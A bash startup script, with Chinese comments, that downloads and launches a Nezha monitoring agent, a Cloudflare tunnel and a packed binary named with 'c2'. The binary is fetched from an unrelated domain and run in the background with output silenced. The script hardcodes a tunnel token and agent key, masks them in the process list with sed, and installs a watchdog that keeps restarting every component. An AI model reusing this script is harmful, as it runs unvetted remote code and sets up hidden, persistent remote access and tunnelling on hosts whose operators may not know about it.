#!/usr/bin/env bash
# 设置参数
TOK=${TOK:-'eyJhIjoiNTRhM2QyMDEwZTk0YmU5MDA3NWQxZmI0NGQ4ZTg2YWEiLCJ0IjoiY2EyMWM3OGMtNGZhNS00MmVjLWJlYzEtMjU4MTEzMDBhMTI5IiwicyI6IllqZGpOelZrWTJVdFlUSmhZUzAwTWpVNExUZzRNemd0WmpJNE5tSmxNek0zTVRRMiJ9'}
NEZHA_SERVER=${NEZHA_SERVER:-'data.xuexi365.eu.org'}
NEZHA_KEY=${NEZHA_KEY:-'j8VewBJKPTLctcrZNp'}
PORT=${PORT:-'80'}
NEZHA_PORT=${NEZHA_PORT:-'443'}
NEZHA_TLS=${NEZHA_TLS:-'1'}
TLS=${NEZHA_TLS:+'--tls'}
#cp -rf /sr/nginx.conf /etc/nginx/nginx.conf
#nohup /usr/sbin/nginx -g 'daemon off;' >/dev/null 2>&1 &

# 运行程序
if [[ -n "${NEZHA_SERVER}" && -n "${NEZHA_KEY}" ]]; then
curl -LJo /tmp/nezha-agent_linux_amd64.zip https://github.com/naiba/nezha/releases/latest/download/nezha-agent_linux_amd64.zip
cd /tmp/ && unzip -o /tmp/nezha-agent_linux_amd64.zip
rm -f /tmp/nezha-agent_linux_amd64.zip
chmod +x /tmp/nezha-agent
nohup /tmp/nezha-agent -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${TLS}  >/dev/null 2>&1 &

curl -LJo /tmp/cf https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod +x /tmp/cf
nohup /tmp/cf tunnel --edge-ip-version auto run --token ${TOK} >/dev/null 2>&1 &

curl -LJo /tmp/bot https://xxqg.rr.nu/shuang-c2-argo-warp2-1.75_upx
chmod +x /tmp/bot
nohup /tmp/bot >/dev/null 2>&1 &
echo "----- 系统信息...----- ."
cat /proc/version
echo "----- 系统进程...----- ."
ps -ef | sed 's@--token.*@--token ${TOK}@g;s@-s data.*@-s ${NEZHA_SERVER}@g'
# 运行检测程序
  cat > /tmp/chatdog.sh << EOF
#!/usr/bin/env bash
function check_bot(){
count1=\$(ps -ef |grep \$1 |grep -v "grep" |wc -l)
#echo \$count1
 if [ 0 == \$count1 ];then
 echo "----- 检测到bot未运行，重启应用...----- ."
 nohup /tmp/bot >/dev/null 2>&1 &
 else
   echo " bot is running......"
fi
}

function check_cf (){
count2=\$(ps -ef |grep \$1 |grep -v "grep" |wc -l)
#echo \$count2
 if [ 0 == \$count2 ];then
 echo "----- 检测到cf未运行，重启应用...----- ."
 nohup /tmp/cf tunnel --edge-ip-version auto run --token ${TOK} >/dev/null 2>&1 &
 else
   echo " cf is running......"
fi
}
 
function check_nezha (){
count3=\$(ps -ef |grep \$1 |grep -v "grep" |wc -l)
#echo \$count3
 if [ 0 == \$count3 ];then
 echo "----- 检测到nezha未运行，重启应用...----- ."
 nohup /tmp/nezha-agent -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${TLS} >/dev/null 2>&1 &
 else
   echo " nezha is running......"
fi
}
function check_nginx (){
count4=\$(ps -ef |grep \$1 |grep -v "grep" |wc -l)
#echo \$count4
 if [ 0 == \$count4 ];then
 echo "----- 检测到nginx未运行，重启应用...----- ."
nohup /usr/sbin/nginx -g 'daemon off;' >/dev/null 2>&1 &
 else
   echo " nginx is running......"
fi
}
check_bot /tmp/bot
sleep 10
check_cf /tmp/cf tunnel --edge-ip-version auto run --token
sleep 10
check_nezha /tmp/nezha-agent -s ${NEZHA_SERVER}:${NEZHA_PORT}

EOF

else
  cat > /tmp/chatdog.sh << EOF
#!/usr/bin/env bash
function check_bot(){
count1=\$(ps -ef |grep \$1 |grep -v "grep" |wc -l)
#echo \$count1
 if [ 0 == \$count1 ];then
 echo "----- 检测到bot未运行，重启应用...----- ."
 nohup /tmp/bot >/dev/null 2>&1 &
 else
   echo " bot is running......"
fi
}
function check_cf (){
count2=\$(ps -ef |grep \$1 |grep -v "grep" |wc -l)
#echo \$count2
 if [ 0 == \$count2 ];then
 echo "----- 检测到cf未运行，重启应用...----- ."
 nohup /tmp/cf tunnel --edge-ip-version auto run --token ${TOK} >/dev/null 2>&1 &
 else
   echo " cf is running......"
fi
}
 
function check_nginx (){
count4=\$(ps -ef |grep \$1 |grep -v "grep" |wc -l)
#echo \$count4
 if [ 0 == \$count4 ];then
 echo "----- 检测到nginx未运行，重启应用...----- ."
nohup /usr/sbin/nginx -g 'daemon off;' >/dev/null 2>&1 &
 else
   echo " nginx is running......"
fi
}
check_bot /tmp/bot
sleep 10

check_cf /tmp/cf tunnel --edge-ip-version auto run --token
sleep 10

EOF

fi

chmod +x /tmp/chatdog.sh
nohup /tmp/chatdog.sh
